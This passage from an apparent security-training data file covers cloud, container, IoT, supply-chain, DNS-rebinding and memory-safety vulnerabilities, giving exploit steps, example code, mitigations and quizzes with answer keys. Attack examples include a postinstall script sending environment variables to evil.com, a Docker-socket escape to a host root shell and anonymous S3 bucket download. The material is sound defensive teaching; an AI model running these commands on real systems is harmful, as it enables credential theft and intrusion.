      "code": "// Vulnerable hardcoded secret in app source\npublic static final String CLOUD_API_KEY = \"AKIAIOSFODNN7EXAMPLE\";\n\n// Attacker decompilation steps\n$ apktool d app-release.apk\n$ grep -r \"AKIA\" app-release/sources/\n# -> finds the hardcoded key in plaintext, ready to use against the cloud provider's API"
    },
    "mitigation": "Never embed secrets in client code; fetch short-lived tokens from a backend after authentication; use platform secure storage and key rotation.",
    "quizzes": [
      {
        "question": "Why are hardcoded secrets in mobile apps considered effectively public?",
        "options": [
          "Mobile app binaries can be easily decompiled, exposing embedded strings and code",
          "Mobile apps are never distributed publicly",
          "App stores encrypt all app binaries",
          "Decompilation requires a court order"
        ],
        "answer": 0
      },
      {
        "question": "What's the correct architecture to avoid embedding long-lived secrets in a mobile app?",
        "options": [
          "Have the app authenticate to a backend, which issues short-lived tokens instead of embedding permanent keys",
          "Obfuscate the variable name containing the secret",
          "Store the secret in a comment instead of code",
          "Encrypt the entire APK file"
        ],
        "answer": 0
      },
      {
        "question": "Does code obfuscation alone solve the hardcoded secrets problem?",
        "options": [
          "No — obfuscation makes analysis harder but determined attackers can still extract embedded secrets",
          "Yes, obfuscation makes secrets completely unrecoverable",
          "Yes, but only on iOS apps",
          "Obfuscation is irrelevant to this vulnerability"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Cloud Storage Misconfiguration (S3 Bucket Exposure)",
    "category": "Cloud",
    "severity": "Critical",
    "definition": "A cloud storage bucket (e.g. AWS S3) is configured with public or overly permissive access, exposing its contents to anyone on the internet.",
    "theory": "Cloud storage defaults to private, but misconfigurations (setting a bucket policy to public-read, enabling 'list objects' for everyone, or misconfigured ACLs) are extremely common and easy to discover via automated scanning of bucket name patterns.",
    "cve": "Numerous disclosed breaches (e.g. Capital One 2019, various unsecured S3 buckets)",
    "exploit": "1. Guess or enumerate likely bucket names (company-backups, company-prod-assets).\n2. Attempt anonymous access: aws s3 ls s3://bucket-name --no-sign-request.\n3. If public, list and download all objects, or even upload malicious content if write access is also misconfigured.",
    "example": {
      "scenario": "A company creates an S3 bucket named 'acmecorp-backups' to store database backups and accidentally leaves the bucket policy set to public-read; a researcher running automated bucket-name enumeration tools discovers it and downloads years of customer data backups without any authentication.",
      "code": "// Vulnerable S3 bucket policy (overly permissive)\n{\n  \"Effect\": \"Allow\", \"Principal\": \"*\",\n  \"Action\": \"s3:GetObject\",\n  \"Resource\": \"arn:aws:s3:::acmecorp-backups/*\"\n}\n\n// Attacker command (no credentials required)\n$ aws s3 ls s3://acmecorp-backups --no-sign-request\n$ aws s3 sync s3://acmecorp-backups ./stolen-data --no-sign-request"
    },
    "mitigation": "Default to private buckets, use bucket policies with explicit least-privilege principals, enable access logging and automated public-exposure scanning.",
    "quizzes": [
      {
        "question": "What is the most common root cause of S3 bucket exposure breaches?",
        "options": [
          "A misconfigured bucket policy or ACL granting public access",
          "A zero-day exploit in AWS itself",
          "Weak TLS encryption",
          "DNS spoofing"
        ],
        "answer": 0
      },
      {
        "question": "How do attackers commonly discover exposed cloud storage buckets?",
        "options": [
          "Automated enumeration of likely/guessable bucket name patterns",
          "Phishing the cloud provider's support staff",
          "Brute-forcing TLS certificates",
          "Exploiting browser vulnerabilities"
        ],
        "answer": 0
      },
      {
        "question": "What's a key preventive control for cloud storage misconfiguration?",
        "options": [
          "Default to private access and run automated scans for accidentally public buckets",
          "Make all buckets public for easier debugging",
          "Disable access logging to reduce noise",
          "Use the same bucket for all environments"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Cloud IAM Over-Privilege",
    "category": "Cloud",
    "severity": "Critical",
    "definition": "Cloud identity and access management (IAM) roles or users are granted far broader permissions than they need, so compromising one credential can lead to compromising the entire cloud environment.",
    "theory": "Following least-privilege is hard at scale, so many organizations grant wildcard permissions (e.g. Action:* or AdministratorAccess) for convenience. If any single over-privileged credential is leaked — via a code repo, SSRF-to-metadata, or a compromised CI pipeline — the attacker inherits all of that excess privilege immediately.",
    "cve": "Capital One 2019 breach context (over-privileged IAM role exploited via SSRF)",
    "exploit": "1. Obtain any cloud credential (leaked key, SSRF to instance metadata, compromised CI secret).\n2. Run aws sts get-caller-identity and aws iam list-attached-role-policies to enumerate actual permissions.\n3. If overly broad, pivot to read all S3 buckets, spin up resources, or access other services entirely unrelated to the original credential's purpose.",
    "example": {
      "scenario": "A CI/CD pipeline's IAM role — intended only to deploy a specific Lambda function — is granted full AdministratorAccess for convenience; when an attacker compromises a dependency in the build pipeline, they inherit that role's credentials and can access every resource in the entire AWS account, not just the Lambda function.",
      "code": "// Vulnerable over-privileged IAM policy attached to the CI role\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"*\",\n  \"Resource\": \"*\"\n}\n\n// Attacker enumeration after compromising the CI pipeline\n$ aws sts get-caller-identity\n$ aws s3 ls   # full access to every bucket in the account, far beyond the CI's actual job"
    },
    "mitigation": "Apply least-privilege IAM policies scoped to specific resources and actions; use short-lived credentials and regularly audit unused permissions.",
    "quizzes": [
      {
        "question": "What is the core risk of over-privileged IAM roles?",
        "options": [
          "Compromising one credential grants access far beyond what that credential's actual job required",
          "It slows down API calls",
          "It only affects billing, not security",
          "It has no impact if MFA is enabled"
        ],
        "answer": 0
      },
      {
        "question": "What IAM principle should be applied to prevent this issue?",
        "options": [
          "Least privilege — scope permissions to exactly what's needed",
          "Maximum privilege for operational flexibility",
          "Shared credentials across all services",
          "No IAM policies at all"
        ],
        "answer": 0
      },
      {
        "question": "Which real-world breach is commonly cited as resulting from an over-privileged IAM role combined with SSRF?",
        "options": [
          "Capital One (2019)",
          "Log4Shell (2021)",
          "Heartbleed (2014)",
          "WannaCry (2017)"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Container Escape",
    "category": "Cloud",
    "severity": "Critical",
    "definition": "An attacker breaks out of a containerized application's isolation boundary to gain access to the underlying host system or other containers.",
    "theory": "Containers share the host kernel, so misconfigurations (running as root, mounting the Docker socket, excessive capabilities, outdated runtimes with kernel exploits) can let code running inside a container escape its isolation and execute on the host directly, compromising every other workload on that machine.",
    "cve": "CVE-2019-5736 (runc container escape)",
    "exploit": "1. Gain code execution inside a container (e.g. via an app vulnerability).\n2. Check for a mounted Docker socket (/var/run/docker.sock) or excessive capabilities (--privileged).\n3. If the socket is mounted, use it to spawn a new privileged container with the host filesystem mounted, achieving host-level access.",
    "example": {
      "scenario": "A CI runner container is started with the host's Docker socket mounted inside it 'to allow building images'; an attacker who compromises a build job uses that socket to launch a new privileged container that mounts the entire host filesystem, escaping the container boundary entirely.",
      "code": "// Vulnerable container launch — mounts the host Docker socket\ndocker run -v /var/run/docker.sock:/var/run/docker.sock ci-runner-image\n\n// Attacker code running inside the compromised container\n$ docker run -v /:/host --privileged -it ubuntu chroot /host bash\n# Now has a root shell on the actual host machine"
    },
    "mitigation": "Never mount the Docker socket into containers unnecessarily, avoid --privileged mode, drop unneeded capabilities, run containers as non-root, keep runtimes patched.",
    "quizzes": [
      {
        "question": "What underlying fact about containers makes escape possible?",
        "options": [
          "Containers share the host's kernel rather than having full hardware-level isolation",
          "Containers always run as root by default",
          "Containers cannot be patched",
          "Containers have no network access"
        ],
        "answer": 0
      },
      {
        "question": "Why is mounting the Docker socket into a container especially dangerous?",
        "options": [
          "It lets code inside the container control Docker itself, including launching new privileged containers with host access",
          "It only affects container startup speed",
          "It is required for all containers to function",
          "It has no security implications if the container is unprivileged"
        ],
        "answer": 0
      },
      {
        "question": "Which practice reduces the risk of container escape?",
        "options": [
          "Avoiding --privileged mode and dropping unnecessary Linux capabilities",
          "Always running containers as root for simplicity",
          "Disabling container image updates",
          "Sharing the same container across all environments"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Kubernetes RBAC Misconfiguration",
    "category": "Cloud",
    "severity": "High",
    "definition": "Overly permissive Kubernetes Role-Based Access Control (RBAC) bindings let a compromised pod or user account perform cluster-wide actions far beyond its intended scope.",
    "theory": "Kubernetes RBAC controls what each service account/user can do within the cluster. Common misconfigurations include binding the cluster-admin role to default service accounts, or granting wildcard verbs/resources, letting any compromised pod escalate to control the entire cluster.",
    "cve": "CVE-2018-1002105 (Kubernetes privilege escalation via API server proxy)",
    "exploit": "1. Gain code execution inside any pod in the cluster.\n2. Check the pod's mounted service account token permissions (kubectl auth can-i --list).\n3. If overly permissive (e.g. bound to cluster-admin), use the token to create new privileged pods, read secrets cluster-wide, or modify any resource.",
    "example": {
      "scenario": "A development team binds the cluster-admin ClusterRole to the default service account for convenience during testing, and this configuration accidentally ships to production; an attacker who compromises any single pod in that namespace inherits full cluster-admin rights over the entire Kubernetes cluster.",
      "code": "# Vulnerable RBAC binding — default service account given cluster-admin\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: dangerous-binding\nsubjects:\n- kind: ServiceAccount\n  name: default\n  namespace: production\nroleRef:\n  kind: ClusterRole\n  name: cluster-admin   # far too broad\n  apiGroup: rbac.authorization.k8s.io\n\n// Attacker inside any compromised pod in that namespace\n$ kubectl auth can-i '*' '*' --all-namespaces   # returns yes"
    },
    "mitigation": "Apply least-privilege RBAC roles scoped to specific namespaces/resources, avoid binding cluster-admin to default service accounts, regularly audit role bindings.",
    "quizzes": [
      {
        "question": "What does Kubernetes RBAC control?",
        "options": [
          "What actions each service account/user can perform within the cluster",
          "Network bandwidth between pods",
          "Container image vulnerability scanning",
          "DNS resolution inside the cluster"
        ],
        "answer": 0
      },
      {
        "question": "Why is binding cluster-admin to a default service account dangerous?",
        "options": [
          "Any pod using that default account inherits full cluster-admin rights if compromised",
          "It only affects logging verbosity",
          "It is required for Kubernetes to function at all",
          "It has no real security impact in modern clusters"
        ],
        "answer": 0
      },
      {
        "question": "What's the recommended RBAC practice in Kubernetes?",
        "options": [
          "Apply least-privilege roles scoped narrowly to specific namespaces and resources",
          "Grant cluster-admin broadly for operational simplicity",
          "Disable RBAC entirely to avoid configuration errors",
          "Use the same service account for every workload"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Default IoT Credentials",
    "category": "IoT",
    "severity": "Critical",
    "definition": "IoT devices ship with factory-default usernames and passwords that are never changed by users or administrators, allowing trivial remote takeover.",
    "theory": "Manufacturers often use identical, publicly documented default credentials (admin/admin, root/12345) across entire product lines. Attackers maintain databases of these defaults and scan the internet for exposed devices, compromising them en masse — the basis of botnets like Mirai.",
    "cve": "CVE-2016-? (Mirai botnet — exploited default Telnet credentials across IoT devices)",
    "exploit": "1. Scan IP ranges for devices with open management ports (Telnet/SSH/web admin).\n2. Attempt a known list of default credentials for the identified device type/vendor.\n3. If successful, gain full control — used historically to build massive botnets (Mirai).",
    "example": {
      "scenario": "A home security camera is sold with the default login 'admin/admin' which the vast majority of customers never change; an internet-wide scanning botnet automatically finds and compromises hundreds of thousands of identical cameras within days of a model's release, just like the Mirai botnet did in 2016.",
      "code": "# Attacker mass-scanning script (conceptual, as used by Mirai-style botnets)\nfor ip in internet_ip_range:\n    try:\n        telnet_login(ip, 'admin', 'admin')\n        telnet_login(ip, 'root', '12345')\n        # ...dozens more known IoT default credential pairs\n    except: continue\n    # On success: device is added to the botnet"
    },
    "mitigation": "Force unique credential setup on first use, disable default accounts, require firmware updates that enforce password changes.",
    "quizzes": [
      {
        "question": "What made the Mirai botnet so effective?",
        "options": [
          "It scanned the internet for IoT devices still using factory-default credentials",
          "It exploited a zero-day in TLS",
          "It used social engineering against device manufacturers",
          "It targeted only desktop computers"
        ],
        "answer": 0
      },
      {
        "question": "What's the most effective fix for the default-credentials problem?",
        "options": [
          "Force users to set a unique password during initial device setup, with no usable default",
          "Document the default password more clearly in the manual",
          "Use a longer default password",
          "Disable the device's network features entirely"
        ],
        "answer": 0
      },
      {
        "question": "Why do default credentials scale into such large-scale compromises?",
        "options": [
          "The same credentials are reused across entire product lines, and most users never change them",
          "Default credentials are encrypted and cannot be exploited",
          "They only affect one device at a time with no automation possible",
          "Manufacturers patch them within hours of shipping"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Insecure Firmware Update Mechanism",
    "category": "IoT",
    "severity": "Critical",
    "definition": "An IoT device accepts firmware updates without verifying their authenticity or integrity, letting an attacker push malicious firmware that persists even after a factory reset.",
    "theory": "If firmware updates aren't cryptographically signed and verified, or are delivered over unencrypted channels, an attacker who can intercept network traffic or access the update mechanism can install malicious firmware — gaining persistent, low-level control of the device that survives reboots and resets.",
    "cve": "CVE-2019-9579 (various IoT firmware signature validation bypass cases)",
    "exploit": "1. Intercept the device's firmware update process (e.g. via a MITM position on the local network or by analyzing the update server protocol).\n2. If updates aren't signed/verified, craft a malicious firmware image and serve it during an update check.\n3. Device installs it, granting the attacker persistent root-level control.",
    "example": {
      "scenario": "A smart thermostat checks for firmware updates over plain HTTP and never verifies a cryptographic signature on the downloaded image; an attacker positioned on the same network performs a man-in-the-middle attack, serving a backdoored firmware image that the device installs without complaint.",
      "code": "// Vulnerable firmware update check (device-side, simplified)\nGET http://updates.vendor.com/firmware/latest.bin   // plain HTTP, no signature check\n// Device flashes whatever .bin file it receives with no validation\n\n// Attacker MITM response (intercepted on local network)\nHTTP/1.1 200 OK\nContent-Type: application/octet-stream\n<malicious-backdoored-firmware-bytes>"
    },
    "mitigation": "Sign firmware images cryptographically, verify signatures before flashing, deliver updates over authenticated/encrypted channels (HTTPS with certificate pinning).",
    "quizzes": [
      {
        "question": "What's the core flaw in an insecure firmware update mechanism?",
        "options": [
          "The device installs firmware without verifying its cryptographic authenticity/integrity",
          "The firmware file is too large",
          "Updates happen too frequently",
          "The device has too much storage"
        ],
        "answer": 0
      },
      {
        "question": "Why is malicious firmware especially dangerous compared to a typical software exploit?",
        "options": [
          "It can persist at a low level and survive factory resets or reboots",
          "It only affects the device's display",
          "It can be removed by simply restarting the device",
          "It only works while connected to the internet"
        ],
        "answer": 0
      },
      {
        "question": "What's the correct mitigation for insecure firmware updates?",
        "options": [
          "Cryptographically sign firmware and verify the signature before installation",
          "Distribute firmware over email attachments",
          "Allow any file to be flashed for flexibility",
          "Disable update checks entirely"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Typosquatting Package Attack",
    "category": "Supply Chain",
    "severity": "High",
    "definition": "An attacker publishes a malicious package with a name very similar to a popular legitimate package, hoping developers mistype the name during installation.",
    "theory": "Package registries (npm, PyPI) allow anyone to publish under any unclaimed name. Attackers register names that are one character off from popular packages (e.g. 'reqeusts' instead of 'requests', 'crossenv' instead of 'cross-env'), embedding malicious code that runs on install via lifecycle hooks.",
    "cve": "Multiple documented npm/PyPI typosquatting campaigns (e.g. 'crossenv' npm incident, 2017)",
    "exploit": "1. Identify a popular package name.\n2. Register slight misspellings/variations on the same registry.\n3. Embed a malicious install script (postinstall hook) that exfiltrates environment variables or installs a backdoor.\n4. Wait for developers to mistype the package name during npm install / pip install.",
    "example": {
      "scenario": "An attacker publishes an npm package named 'expres' (missing the second 's' from the popular 'express' framework) containing a malicious postinstall script; developers who mistype the install command unknowingly run code that exfiltrates their environment variables, including cloud credentials, straight to the attacker.",
      "code": "// Malicious package.json of the typosquatted package\n{\n  \"name\": \"expres\",\n  \"scripts\": {\n    \"postinstall\": \"node steal.js\"\n  }\n}\n\n// steal.js — runs automatically on `npm install expres`\nrequire('https').request('https://evil.com/collect', { method: 'POST' })\n  .end(JSON.stringify(process.env)); // exfiltrates all environment variables, including secrets"
    },
    "mitigation": "Double-check package names before installing, use lockfiles, enable registry-side typosquat detection, vet packages before adding to dependencies.",
    "quizzes": [
      {
        "question": "Typosquatting attacks rely on what mistake by the victim?",
        "options": [
          "Mistyping a popular package name during installation",
          "Using an outdated browser",
          "Clicking a phishing email link",
          "Reusing a weak password"
        ],
        "answer": 0
      },
      {
        "question": "What mechanism commonly delivers the malicious payload once a typosquatted package is installed?",
        "options": [
          "A postinstall lifecycle script that runs automatically",
          "A manually executed binary the user must run separately",
          "An email sent after installation",
          "A browser extension"
        ],
        "answer": 0
      },
      {
        "question": "What's a practical defense against typosquatting attacks?",
        "options": [
          "Carefully verify package names and use lockfiles to pin exact, reviewed dependencies",
          "Always install the newest version of any similarly-named package",
          "Disable package manager security features",
          "Avoid using any third-party packages ever"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "DNS Rebinding",
    "category": "Infrastructure",
    "severity": "High",
    "definition": "An attacker-controlled DNS server changes the IP address a domain resolves to after the browser's initial security check, allowing JavaScript to bypass same-origin restrictions and reach internal network services.",
    "theory": "A victim's browser loads a page from attacker.com (resolving to a public IP), but the attacker's DNS server then changes that same domain's resolution to an internal IP (like 192.168.1.1). Because the browser still considers it the 'same origin', the attacker's JavaScript can now make requests to internal network devices that should never be reachable from the internet.",
    "cve": "Various router/IoT device exploitation chains using DNS rebinding documented by security researchers",
    "exploit": "1. Victim visits attacker.com, which resolves to a public IP with a very short DNS TTL.\n2. Attacker's DNS server quickly changes the record to an internal IP (e.g. the victim's router at 192.168.0.1).\n3. The page's JavaScript, still considered same-origin, now sends requests that actually reach the victim's internal router or IoT devices.",
    "example": {
      "scenario": "An attacker hosts a page that initially resolves to their own server, then rapidly reconfigures their DNS to point the same hostname at the victim's home router's internal IP address; the page's JavaScript — still trusted as same-origin by the browser — then issues requests that reconfigure the victim's actual router.",
      "code": "// Attacker's DNS server config (very short TTL, then changes the A record)\nevil.com.  1  IN  A  203.0.113.5   // initial: attacker's public server\n// ...60 seconds later, attacker flips the DNS record...\nevil.com.  1  IN  A  192.168.0.1   // victim's internal router\n\n// Page JS, still considered same-origin by the browser\nfetch('http://evil.com/setDNS?server=attacker-dns')  // now actually hits the victim's router"
    },
    "mitigation": "Validate the Host header server-side, pin DNS resolutions, reject requests where the resolved IP is in a private/internal range, use DNS rebinding protection on internal services.",
    "quizzes": [
      {
        "question": "DNS rebinding exploits a change in what, after the browser's initial trust decision?",
        "options": [
          "The IP address a domain resolves to",
          "The page's HTML content",
          "The TLS certificate's expiry date",
          "The browser's user agent string"
        ],
        "answer": 0
      },
      {
        "question": "What does DNS rebinding ultimately let an attacker's JavaScript reach?",
        "options": [
          "Internal network services/devices that should not be reachable from the internet",
          "Only the attacker's own server",
          "The browser's password manager",
          "The operating system's kernel directly"
        ],
        "answer": 0
      },
      {
        "question": "What's an effective server-side defense against DNS rebinding attacks targeting internal services?",
        "options": [
          "Validate the Host header and reject requests resolving to unexpected/internal IP ranges",
          "Increase the DNS TTL to a very large value",
          "Disable HTTPS for internal services",
          "Allow all incoming Host headers"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Server Misconfiguration (Debug Mode & Default Files Exposed)",
    "category": "Infrastructure",
    "severity": "High",
    "definition": "A production server is left running with debug mode enabled, default/sample files present, or verbose error pages exposed, leaking internal details or providing direct attack footholds.",
    "theory": "Frameworks often ship with debug consoles, sample admin pages, or default credentials meant only for development. If these aren't disabled or removed before going to production, they expose stack traces, environment variables, or even an interactive code execution console directly to attackers.",
    "cve": "CVE-2015-5076 (Django debug mode information disclosure issues), CVE-2018-7600 (Drupalgeddon2)",
    "exploit": "1. Trigger an application error (malformed input, invalid route) and observe the response.\n2. If a detailed stack trace or framework debug page appears, it may expose file paths, environment variables, or even an interactive debugger.\n3. Also check for leftover default files (e.g. /phpinfo.php, /admin/install.php) that frameworks ship with during setup.",
    "example": {
      "scenario": "A Django application is accidentally deployed to production with DEBUG=True still set; visiting any URL that triggers an unhandled exception returns a full interactive traceback page exposing database credentials, secret keys, and an interactive Python console that an attacker can use to execute arbitrary code.",
      "code": "# Vulnerable production settings.py\nDEBUG = True  # never disabled before deployment\n\n// Attacker triggers any error, e.g. requesting a non-existent route with bad input\nGET /nonexistent?param=' OR 1=1\n// Response: full Django debug page with settings.py contents, env vars,\n// and an interactive traceback console embedded in the HTML"
    },
    "mitigation": "Disable debug mode in production, remove default/sample files before deployment, use generic error pages, automate configuration audits in CI/CD.",
    "quizzes": [
      {
        "question": "Why is leaving debug mode enabled in production dangerous?",
        "options": [
          "It can expose stack traces, secrets, environment variables, or even an interactive debug console",
          "It only affects page load speed",
          "It disables the database connection",
          "It has no security relevance, only cosmetic differences"
        ],
        "answer": 0
      },
      {
        "question": "What kind of leftover files are commonly exploited in server misconfiguration attacks?",
        "options": [
          "Default/sample setup files like phpinfo.php or install wizards left on the production server",
          "User profile pictures",
          "CSS stylesheets",
          "Favicon files"
        ],
        "answer": 0
      },
      {
        "question": "What's a good practice to catch these misconfigurations before they reach production?",
        "options": [
          "Automate configuration audits/checks as part of the CI/CD deployment pipeline",
          "Manually check the server once a year",
          "Rely solely on developers remembering to disable debug mode",
          "Enable debug mode permanently for easier support"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Use-After-Free",
    "category": "Memory Safety",
    "severity": "Critical",
    "definition": "A program continues to use a pointer to memory after that memory has been freed, leading to undefined behavior that attackers can exploit for code execution.",
    "theory": "In unsafe languages (C/C++), freeing memory doesn't erase the pointer referencing it (a 'dangling pointer'). If that memory is reallocated for attacker-controlled data before the original pointer is used again, the program ends up reading or executing attacker-controlled content, often leading to remote code execution in browsers and other complex native software.",
    "cve": "CVE-2021-21224 (Chrome V8 use-after-free RCE)",
    "exploit": "1. Find a code path where an object is freed but a reference to it is used later.\n2. Trigger an allocation of attacker-controlled data that reuses that same freed memory slot (heap grooming).\n3. When the dangling pointer is used again, it now points to attacker-controlled data, often achieving code execution.",
    "example": {
      "scenario": "A browser's JavaScript engine frees an object when a certain DOM element is removed, but a callback still holds a reference to it; an attacker times a heap allocation to reuse that exact freed memory slot with crafted data, then triggers the dangling callback to gain code execution inside the browser.",
      "code": "// Vulnerable C++ pattern (simplified)\nWidget* w = new Widget();\ndelete w;          // memory freed, but pointer 'w' still exists (dangling)\n// ... attacker-controlled allocation reuses the same freed memory slot ...\nw->doSomething();  // use-after-free: now operates on attacker-controlled data"
    },
    "mitigation": "Use memory-safe languages where possible, smart pointers / RAII in C++, set pointers to null after freeing, use sanitizers (ASan) during development.",
    "quizzes": [
      {
        "question": "A use-after-free bug occurs when a program does what?",
        "options": [
          "Continues to use a pointer after the memory it references has been freed",
          "Allocates too much memory at once",
          "Reads a file that doesn't exist",
          "Uses an expired TLS session"
        ],
        "answer": 0
      },
      {
        "question": "What technique do attackers use to control the contents of memory that will be reused after a free?",
        "options": [
          "Heap grooming — carefully timing allocations to land attacker-controlled data in the freed slot",
          "SQL injection",
          "DNS spoofing",
          "Phishing"
        ],
        "answer": 0
      },
      {
        "question": "Which practice in C++ helps prevent use-after-free bugs?",
        "options": [
          "Using smart pointers / RAII patterns instead of manual new/delete",
          "Always allocating maximum possible memory upfront",
          "Disabling garbage collection",
          "Avoiding pointers entirely is the only fix and impossible in C++"
        ],
        "answer": 0
      }
    ]
  }
];
